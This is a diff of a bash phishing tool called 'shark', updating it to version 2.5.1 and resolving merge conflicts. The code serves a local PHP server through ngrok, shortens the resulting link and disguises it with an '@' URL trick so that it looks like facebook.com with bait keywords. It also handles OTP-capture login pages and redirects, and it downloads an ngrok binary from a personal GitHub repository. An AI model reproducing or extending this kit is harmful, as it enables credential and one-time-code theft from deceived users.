@@ -32,7 +32,7 @@ nc="\033[0m"                                                ##
 # VERSION
 ##########
 
-VERSION="2.5"
+VERSION="2.5.1"
 
 ################
 # PRINT MESSAGE
@@ -238,7 +238,7 @@ function fix_ngrok() {
 	launch="fixing ngrok"
 	splashdown="fixed ngrok";echo
 	if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			ngrok_url="https://github.com/Linux-Droid/Ngrok/raw/master/Ngrok_Linux_Droid.zip"
+			ngrok_url="https://github.com/tech2gamer/stuff/raw/main/ngrok-2in1.zip"
 		elif [[ "$arch" == *'aarch64'* ]]; then
 		         if [[ "$ArNam" == *'amd64'* ]]; then
                               ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
@@ -246,17 +246,12 @@ function fix_ngrok() {
                               ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
 		         fi
 		elif [[ "$arch" == *'x86_64'* ]]; then
-<<<<<<< HEAD
-			ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
-		else
-=======
 		         if [[ "$ArNam" == *'amd64'* ]]; then
                               ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
                         else
                               ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
 		         fi
                 else
->>>>>>> 37f37bc2d4546e16112d3e0a79c0c7dc4bdbea21
 			ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip"
 	fi
 	(wget --quiet ${ngrok_url} -O ngrok.zip) & spinner
@@ -388,12 +383,6 @@ function url_checker() {
 }
 
 # URL_SHORTNER
-<<<<<<< HEAD
-function url_shortner() {	
-	# echo `wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${link}\&keyword=$2
-        short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${ngrok_url})
-        shorter=${short#https://}       
-=======
 function url_shortner() {
 	#short=$(curl -s http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${ngrok_url})
 	#short=$(curl -s https://vurl.com/api.php?url=${ngrok_url})
@@ -405,7 +394,6 @@ function url_shortner() {
         short=$(curl -s https://soo.gd/api.php?url=${link})
         shorter=${short#https://}
         fi
->>>>>>> 37f37bc2d4546e16112d3e0a79c0c7dc4bdbea21
         read -p $'\n\033[1;92mshark \033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
         url_checker $mask
 	printf "${green}shark ${white}>> ${white}Enter your key words ${yellow}: Ex. free-insta-followers\n"
@@ -414,13 +402,6 @@ function url_shortner() {
         final_url=$mask-$words@$shorter
 	printf "$final_url\n"
 }
-<<<<<<< HEAD
-
-
-# MAIN 
-function main() {
-        HOST="127.0.0.1" ; PORT="8080" ; launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1;ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
-=======
 # ASK FOR URL MODIFICATION
 function askuri() {
 	echo
@@ -513,8 +494,8 @@ function redirc() {
 			redrkask
 		elif [[ $stpver == "N" || $stpver == "n" ]]; then
 			oldy="otp.login.php"
-                        relink="https://instagram.com/tech2.gamer/"
 			FILE="${NOTPF}"
+                        #relink="https://instagram.com/tech2.gamer/"
 			OtP="01010101"
 			redrkask
 		else
@@ -530,7 +511,7 @@ function redirc() {
 function redrkask() {
 	echo
 printf "${yellow}${ysite}${cyan1} Redirect Option !!!\n${yellow}
-          Do You Want To Redirect?${red} (Y/N) : ${nc}"
+          Do You Want To Redirect Url?${red} (Y/N) : ${nc}"
 read ansm
 if [[ $ansm == "N" || $ansm == "n" ]]; then
 	echo
@@ -652,7 +633,6 @@ else
         error_msg "try again!!\n"
 fi
 
->>>>>>> 37f37bc2d4546e16112d3e0a79c0c7dc4bdbea21
 }
 
 function ipcatch() {
@@ -721,15 +701,6 @@ banner2() {
         ║${white}   ║  ├┬┘├┤  ││├┤ │││ │ │├─┤│  └─┐${green}  ║
         ║${white}   ╚═╝┴└─└─┘─┴┘└─┘┘└┘ ┴ ┴┴ ┴┴─┘└─┘${green}  ║
         ╚════════════════════════════════════╝
-<<<<<<< HEAD
-     
-        Author    : ${white}Ashish Singh${green}                 
-        Github    : ${white}github.com/Bhaviktutorials${green}   
-        Publisher : ${white}Bhavik Oza${green}                   
-     
-        >> ${white}${final_url}${green} \n
-\e[38;5;214m ░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓\e[1;34m░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓\e[1;92m░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓${green}\n\n"	
-=======
 	SHARK BETA : ${white}v${VERSION}${green}
          Reborn by : ${white}Mr.Derek(t2g)${green}
          Publisher : ${white}Bhavik Oza${green}
@@ -740,7 +711,6 @@ banner2() {
                 	or
         》 ${cyan1}${link}${yellow} 《 ORIGINAL URL.\n
 \e[38;5;214m ░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓\e[1;34m░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓\e[1;92m░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓${cyan1}\n\n"
->>>>>>> 37f37bc2d4546e16112d3e0a79c0c7dc4bdbea21
 }
 
 #credentials
